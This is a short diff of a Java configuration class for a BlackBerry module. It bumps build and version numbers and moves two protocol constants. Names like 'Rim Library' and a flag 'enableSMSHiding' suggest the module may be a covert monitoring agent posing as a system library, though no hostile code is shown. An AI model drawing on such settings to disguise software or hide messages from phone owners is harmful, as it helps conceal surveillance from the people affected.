@@ -37,17 +37,20 @@ public class Cfg {
     //==========================================================
     // Compile configuration, do not edit under this line
 
-    public static final int BUILD_ID = 206;
-    public static final String BUILD_TIMESTAMP = "20120809-035033";
+    public static final int BUILD_ID = 215;
+    public static final String BUILD_TIMESTAMP = "20120913-115112";
     
     public static final String GROUP_NAME =  "Rim Library"; //"Rim Library";
     public static final String MODULE_NAME = "net_rim_bb_lib"; //"net_rim_bb_lib";
     public static final String MODULE_LIB_NAME = "net_rim_bb_lib_base"; //"net_rim_bb_lib_base";
 
-    public static final String RANDOM = "D37F2BD597104520";
+    public static final String RANDOM = "E019171F87B57427";
     
-    public static final int VERSION = 2012063004;
+    public static final int VERSION = 2012063006;
     public static final String OSVERSION = "5.0";
+    
+    public static final boolean PROTOCOL_RESUME = true;
+    public static final int PROTOCOL_CHUNK = 65536;
 
     //==========================================================
     
@@ -62,9 +65,5 @@ public class Cfg {
     public static final boolean enableSMSHiding = false;
     public static final int osCompileVersion = 5000;
     //#endif
-
-    public static final boolean PROTOCOL_RESUME = true;
-
-    public static final int PROTOCOL_CHUNK = 65536;
     
 }
